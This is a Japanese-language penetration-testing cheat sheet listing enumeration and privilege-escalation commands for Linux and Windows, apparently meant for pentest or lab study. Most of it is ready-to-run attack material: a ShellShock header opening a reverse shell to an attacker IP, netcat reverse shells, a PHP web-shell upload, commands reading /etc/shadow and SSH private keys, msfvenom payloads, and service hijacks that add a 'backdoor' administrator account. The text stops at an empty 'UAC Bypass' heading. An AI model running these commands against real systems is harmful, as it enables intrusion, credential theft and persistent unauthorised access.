# Penetration Test CheetSheet

1. [情報取集](#情報収集)
   - [FTP](#ftp)
   - [SSH](#ssh)
   - [SMTP](#smtp)
   - [DNS](#dns)
   - [Finger](#finger)
   - [POP](#pop)
   - [SMB](#smb)
   - [HTTP/HTTPS](#httphttps)
   - [SNMP](#snmp)
   - [Nmap](#nmap)
   - [Exploit Search](#exploitsearch)
2. [権限昇格](#権限昇格)
   - [Linux](#linux)
   - [Windows](#windows)
3. [その他](#その他)
   - [BufferOverFlow](#bufferoverflow)
   - [File転送](#file転送)
   - [PHP](#php)
   - [PayloadCollection](#payloadcollection)
   - [ReversShell](#rreversshell)
   - [MsfVenom](#msfvenom)
4. [参考サイト](#参考サイト)
5. [免責事項](#免責事項)



# 情報取集

## POP

#### 接続

```bash
nc -nvC <IP> <port>
user <name>
pass <password>

LIST

retr <number>
```

#### commands

```bash
POP commands:
  USER uid           uidでログイン
  PASS password      実際のパスワードを "password"に置き換えてください。
  STAT               メッセージ数、メールボックスの合計サイズを一覧表示
  LIST               リストメッセージとサイズ
  RETR n             Show message n
  DELE n             メッセージnを削除するためにマークします。
  RSET               変更を元に戻す
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          メッセージ番号 msg の最初の n 行を表示
  CAPA               機能を取得する
```

#### リンク

[HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-pop)

## SMB

#### 情報収集

```bash
smbclient -N -L //<IP>
nmap --script smb-enum-shares.nse -p445 <IP>
smbclient -N //<IP>/Development 
```

#### Download files

```bash
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
```

#### Mount a shared folder

```bash
mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share
```

#### Metasploit

```bash
#version
auxiliary module _auxiliary/scanner/smb/smb_version 
```

#### 接続

```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE>
smbclient -U '<USER>' \\\\<IP>\\<SHARE> 
smbclient --no-pass -L //<IP> 
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> 
```

#### 検索

```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```

#### リンク

[HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smb)

https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/

## FTP

#### ブラウザーでアクセスする

```bash
ftp://anonymous:anonymous@<IP>
```

#### ダウンロードファイル

```bash
wget -m ftp://anonymous:anonymous@<IP>
wget -m --no-passive ftp://anonymous:anonymous@<IP> 
```

#### Banner

```bash
telnet -vn <IP> 21
```

#### 匿名ユーザーでのログイン

```bash
ftp <IP>
>anonymous
>anonymous
# すべてのファイルをリストアップ
>ls -a
#送信をアスキーの代わりにバイナリに設定する
>binary
#バイナリの代わりにアスキーに送信を設定する
>ascii
#exit
>bye
```

#### リンク

[HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-ftp)

## SSH

#### 設定ファイル

```
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```

#### SFTP トンネリング

```bash
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>
```

#### Banner

```bash
nc -vn <IP> 22
```

#### BruteForce

```bash
msf> use scanner/ssh/ssh_enumusers
msf> use scanner/ssh/ssh_identify_pubkeys
```

https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt

#### リンク

[BadKeys](https://github.com/rapid7/ssh-badkeys/tree/master/authorized)

[HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-ssh)

## SMTP

#### 接続

```bash
nc -nvC <IP> 25
VRFY root
VRFY idontexist
```

#### MXサーバを探す

```bash
dig +short mx <host>
```

#### RCPT TO

```bash
telnet <IP> 25
#Trying 10.0.10.1...
#Connected to 10.0.10.1.
#Escape character is '^]'.
#220 myhost ESMTP Sendmail 8.9.3
HELO <domain or ip>
#250 myhost Hello [10.0.0.99], pleased to meet you
MAIL FROM:test@test.org
#250 2.1.0 test@test.org... Sender ok
RCPT TO:test
#550 5.1.1 test... User unknown
RCPT TO:admin
#550 5.1.1 admin... User unknown
RCPT TO:ed
#250 2.1.5 ed... Recipient ok
```

#### VRFY

```bash
telnet <IP> 25
#Trying 10.0.0.1...
#Connected to 10.0.0.1.
#Escape character is '^]'.
#220 myhost ESMTP Sendmail 8.9.3
HELO
#501 HELO requires domain address
HELO x
#250 myhost Hello [10.0.0.99], pleased to meet you
VRFY root
#250 Super-User <root@myhost>
VRFY blah
#550 blah... User unknown
```

#### EXPN

```bash
telnet <IP> 25
#Trying 10.0.10.1...
#Connected to 10.0.10.1.
#Escape character is '^]'.
#220 myhost ESMTP Sendmail 8.9.3
HELO
#501 HELO requires domain address
HELO x
EXPN test
#550 5.1.1 test... User unknown
EXPN root
#250 2.1.5 <ed.williams@myhost>
EXPN sshd
#250 2.1.5 sshd privsep <sshd@mail2>
```

#### Auto Tool

```bash
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum
nmap –script smtp-enum-users.nse <IP>
```

## DNS

#### Banner

```bash
dig version.bind CHAOS TXT @DNS
nmap --script dns-nsid
```

#### 情報収集

```bash
Zero Transfor
dig axfr <host> @<DNS_IP>
dig axfr @<DNS_IP> 
dig axfr @<DNS_IP> <DOMAIN> 
fierce -dns <DOMAIN>
```

#### nslookup

```bash
nslookup
> SERVER <IP_DNS> #Select dns server
> 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...
> <IP_MACHINE> #Reverse lookup of a machine, maybe...
```

#### metasploit

```
auxiliary/gather/enum_dns 
```

#### nmap

```bash
nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" <IP>
```

#### 設定ファイル

```bash
host.conf
resolv.conf
named.conf
```

## Finger

#### Bannerと接続

```bash
nc -vn <IP> 79
echo "root" | nc -vn <IP> 79
```

#### ユーザ列挙

```bash
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user
```

#### Metasploit

```
use auxiliary/scanner/finger/finger_users	
```

#### コマンド実行

```bash
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```

#### リンク

[HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-finger)

## HTTP/HTTPS

#### ShellShock

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attcker IP>/<port> 0>&1' <url>
```

#### curl

```bash
https://0xdf.gitlab.io/2019/03/06/htb-granny.html
#使用できるメソッドを調査する
davtest --url <url>
curl -vvv <url>
curl --head -X OPTIONS <url>
curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://[host]/_vti_bin/_vti_aut//shell.php
curl --url <url> -X DELETE


webdav
echo AAAAA > test.txt
curl -X PUT <url>/df.txt -d @test.txt
curl <url>/df.txt
curl -X MOVE -H 'Destination:<url>/AAAAA.aspx' <url>/AAAAA.txt
curl -X PUT http://[host]/met.txt --data-binary @met.aspx
```

#### CMS Scan

```bash
wpscan --url http://symfonos.local/h3l105/ --enumerate p,t,u
wpscan --force update -e --url <URL>
joomscan --ec -u <URL>
```

#### Scan

```bash
nikto -h <URL>
```

#### ディレクトリー調査

```bash
gobuster dir -k  -u <host> -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e -t 100 -x .php,.sh,.html,.txt
gobuster dir -u <host> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k -x .php,.txt,.html,.conf --timeout 40s -t 150
drib <host>
```



## ExploitSearch

```
#Google

#Searchsploit

#ExploitDB

#SecurityFocus
http://www.securityfocus.com

#Securite.com????
http://www.securiteam.com

#ExploitSearch
http://www.exploitsearch.net

#metasploit
http://metasploit.com/modules/

#Securityreason
http://securityreason.com

#seclists
http://seclists.org/fulldisclosure/

#CVE
http://www.cvedetails.com
http://packetstormsecurity.org/files/cve/[CVE]
http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
http://www.vulnview.com/cve-details.php?cvename=[CVE]
```

## Nmap

#### TCP

```bash
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>
namp -sS -sV -p- <IP>
nmap <IP> --top-ports 10 --open
nmap -Pn -n -sV --script vuln <IP>
```

#### UDP

````bash
nmap -sU -p- --min-rate 10000 -oA <file_name> <IP>
nmap -sU -sC --top-ports 20 -oA <file_name> <IP>
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
nmap -sU -sV -sC -n -F -T4 <IP> 
````

## arp

```bash
arp-scan <IP>
```

# 権限昇格

## Linux

### 情報収集

#### OS情報

```bash
#OSの情報
cat /etc/issue
cat /etc/*-release
＃Debian
cat /etc/lsb-release 
＃Redhat
cat /etc/redhat-release 

#Kernelのバージョン
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
arch

#karnel exploits
searchsploit "Linux Kernel"
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

#### プリンター

```bash
lpstat -a
```

#### 環境変数

```bash
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
(env || set) 2>/dev/null

echo $PATH

#CVE-20160-5195
CVE-2016-5195 (DirtyCow)
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```



### Application & Services

 #### root権限で実行されている確認

```bash
ps aux | grep root
ps -ef | grep root
```

##### アプリケーション情報

```bash
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/

#インストールされてるソフトウェア
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc rkt kubectl 2>/dev/null

(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

##### 設定ファイル

```bash
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/

#Installed Software
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc rkt kubectl 2>/dev/null

(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

#### Cron

```bash
crontab -l
ls -al /etc/cron* /etc/at* 
ls -alh /var/spool/cron
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Root権限で動いているCronを探すときはPSPYを使用する。

https://github.com/DominicBreuker/pspy

cronで実行しているスクリプトにWildcards Injectionがある場合

```bash
#example
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>

#実行されるまで待つ
/tmp/bash -p
```

root で実行されるスクリプトがフルアクセスできるディレクトリを使用している場合、そのフォルダを削除して、制御するスクリプトフォルダへのシンボリックリンクを作成する

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```



#### ユーザ名とパスワード

```bash
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
```

#### 実行中のサービス

```bash
ps aux
ps -ef
top
cat /etc/services

#/dev/mem
strings /dev/mem -n10 | grep -i PASS
```

## ネットワーク

#### ネットワーク設定

```bash
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```

#### 他のユーザとホスト

```bash
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w

#開いているポート
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```

#### Cache IPとMAC

```bash
arp -e
route
/sbin/route -nee
```

#### 待受シェル

```bash
nc -lvp 4444
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445
```

#### トンネリング

```bash
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig
```

#### ポートフォワーティング

```bash
#ローカルポート
ssh -L 8080:127.0.0.1:80 root@[IP]
#リモートポート
ssh -R 8080:127.0.0.1:80 root@[IP]

# Port Relay
mknod backpipe p ; nc -l -p 8080 < backpipe | nc [IP] 80 >backpipe 
# Proxy (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe   
# Proxy monitor (Port 80 to 8080
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    
```

#### 他のネットワーク

```bash
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
```

## ユーザ情報と機密情報

```bash
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
cat /etc/group
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null


ls -alh /var/mail/
```

####　ホームティレクトリー

```bash
ls -ahlR /root/
ls -ahlR /home/
```

#### 設定済みパスワード

```bash
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```

#### ユーザ設定

```bash
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

#### プライベートキー

```bash
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

#### ユーザ情報

```bash
id
who
whoami
w
last | tail
lastlog

 # ユーザリスト
cat /etc/passwd | cut -d: -f1 

# スーパーユーザリスト
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'  

# スーパーユーザリスト
awk -F: '($3 == "0") {print}' /etc/passwd   

cat /etc/sudoers
sudo -l

for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort

#Current user PGP keys
gpg --list-keys 2>/dev/null
```

## File System

/var/info

```bash
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
```

/settings/files

```bash
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```

log files

```bash
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
```

file-systems mounted

```bash
mount
df -h
#unmounted file systems
cat /etc/fstab
```

#### 有効なシェルを獲得する

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```

#### Stickyibits, SUID and GUID

https://gtfobins.github.io/

```bash
# スティッキービット - ディレクトリの所有者かファイルの所有者のみが削除やリネームを行うことができます。
find / -perm -1000 -type d 2>/dev/null   
#SGID (chmod 2000) - 起動したユーザではなく、グループとして実行します。
find / -perm -g=s -type f 2>/dev/null  
# SUID (chmod 4000) - 起動したユーザではなく、所有者として実行します。
find / -perm -u=s -type f 2>/dev/null
```

#### Written follders

```bash
# world-writeable folders
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# world-executable folders
find / -perm -o x -type d 2>/dev/null
# world-writeable & executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   
```

#### /etc/ written file

```bash
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other

find /etc/ -readable -type f 2>/dev/null               # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
```

#### Preparatoin

```bash
#installed tool
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc

#upload tools
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```

#### プリコンパイルされているバイナリー

https://github.com/lucyoa/kernel-exploits/

https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits

## Windows

#### 情報収集

```bash
systeminfo
#ホスト情報のみ表示
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" 

#パッチ
wmic qfe get Caption,Description,HotFixID,InstalledOn 

#システムアーキテクチャ
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%

#powershell
#OS バージョン
[System.Environment]::OSVersion.Version 
#パッチ
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} 
#セキュリティアップデートパッチ
Get-Hotfix -description "Security update" 
```

#### 環境情報

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```

#### パスワードポリシー

```bash
net accounts
```

#### Clipboard

```bash
powershell -command "Get-Clipboard"
```

#### ホームディレクトリ

```cmd
dir C:\Users
Get-ChildItem C:\Users
```

#### ドライバー

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root

driverquery
driverquery.exe /fo table
driverquery /SI
```

#### ユーザ譲歩

```bash
whoami
echo %username%
#どのユーザの特権を持つか 
whoami /priv
whoami /all
#どのユーザーがいるのか
net users
net users %username% 
#誰が管理者か
net localgroup administrators
net localgroup

#PowerShell
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

#### Credential manager

```bash
cmdkey /list
```

#### Kerberos tickets

````
klist
klist sessions
````

#### ログインユーザ

```bash
qwinsta
```

#### 開いているポート

```
netstat -aton
```

#### ファイアーウォール

```bash
netsh firewall show state
netsh firewall show config
```

#### パスワード

```cmd
#Password hashes
/usr/share/windows-binaries/fgdump/fgdump.exe
C:\> fgdump.exe
C:\> type 127.0.0.1.pwdump

#ドメインコントローラの場合は、groups.xml内の "cpassword "を検索します。
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml

#ファイル名に「password」を含むファイルを検索します。
dir /s *password*

#ファイル内の「パスワード」を検索します。
findstr /si password *.ini *.xml *.txt
findstr /spin "password" *.*

#いくつかの共通ファイル。
type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type c:\unattend.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
```

#### Unquoted Service Path(引用符なしのサービスパス)

引用符で囲まれていないすべてのサービスパスを一覧表示する (Windows 組み込みのサービスを除く)

```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

Metasploit

```
exploit/windows/local/trusted_service_path
```

MsfVenom

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

#### PATH DLL Hijacking

PATH上のフォルダ内に書き込み権限を持っている場合、プロセスが読み込んだDLLをハイジャックして権限を昇格させることができます。
PATH内の全てのフォルダの書き込み権限を確認してください。

```cmd
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

#### AlwaysInstallElevated(インストールレベル)

以下のレジストリ設定が「1」になっているか確認してください。

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

そうであれば、ローカルユーザーを追加する悪意のあるMSIを作成してください。

```bash
msfvenom -p windows/adduser USER=hodor PASS=Qwerty123! -f msi -o hodor.msi
```

msiを実行します。

```cmd
msiexec /quiet /qn /i C:\hodor.msi
```

#### スケジュールタスク

```cmd
#スケジュールされたタスクを一覧表示
schtasks /query /fo LIST /v
#実行中のプロセスとサービスを一覧表示
Tasklist /SVC 
#"システム "プロセスをフィルタリングする
tasklist /v /fi "username eq system" 
```

#### インストールされているアプリケーション

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

アプリケーションの権限を確認する

```cmd
accesschk.exe /accepteula 

# ドライブごとに弱いフォルダのパーミッションをすべて検索します.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\

# ドライブごとの弱いファイルパーミッションをすべて検索します.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*


icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"


Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

#### Network

```cmd
#host file
type C:\Windows\System32\drivers\etc\hosts

#Interfaces & DNS
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft

#Open Ports
netstat -ano

#Routing Table
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex

#Arp Table
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

#### Credentials manager / Windows vault

マシンに保存されている資格情報を一覧表示するには、cmdkey を使用します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

 そして、/savecred オプションを指定して runas を使用することで、保存された資格情報を使用することができます。次の例は、SMB 共有を経由してリモートバイナリーを呼び出しています。

```bash
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

 提供されたクレデンシャルのセットでrunasを使用しています。

```cmd
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

#### サービスな不正な権限

不正なファイル権限で管理者/システムとして実行されているサービスは、EoPを許可する場合があります。バイナリを置き換え、サービスを再起動してシステムを取得できます。

権限が次のようなサービスがないか確認してください。

グループの（F）または（C）または（M）を持つBUILTIN \ Users。

https://msdn.microsoft.com/en-us/library/bb727008.aspx

一般的な悪用ペイロードには、次のものが含まれます。影響を与えるバイナリをリバースシェルまたは新しいユーザーを作成して管理者グループに追加するコマンドに置き換える。影響を受けるサービスをペイロードに置き換えて、実行中のサービスを再起動します。

```cmd
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]

sc start/stop serviceName
```

次のコマンドは、影響を受けるサービスを出力します。

```cmd
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```

wmicが利用できない場合は、sc.exeを使用できます。

````cmd
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
````

caclsを使用して各サービスを手動で確認することもできます。

```cmd
cacls "C:\path\to\file.exe"
```

#### UpnpHost

```cmd
sc qc upnphost
```

````cmd
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
````

依存関係がないために失敗した場合は、以下を実行します。

```cmd
sc config SSDPSRV start= auto
net start SSDPSRV
net start upnphost
```

または、依存関係を削除します。

```cmd
sc config upnphost depend= ""
```

Meterpreterの使用：

```
> exploit/windows/local/service_permissions
```

wmicとscが利用できない場合は、accesschkを使用できます。Windows XPの場合、accesschkのバージョン5.2が必要です。

```
https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe
```

```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\
```

次に、Windowsscを使用してサービスにクエリを実行します。

```cmd
sc qc <vulnerable service name>
```

次に、binpathを変更して、独自のコマンドを実行します（サービスの再起動が必要になる可能性があります）。

```bash
sc config <vuln-service> binpath= "net user backdoor backdoor123 /add"
sc stop <vuln-service>
sc start <vuln$ -service>
sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add"
sc stop <vuln-service>
sc start <vuln-service>
```

注-depend属性を明示的に使用する必要がある場合があります。

```bash
sc stop <vuln-service>
sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
sc start <vuln-service>
```

#### UAC Bypass

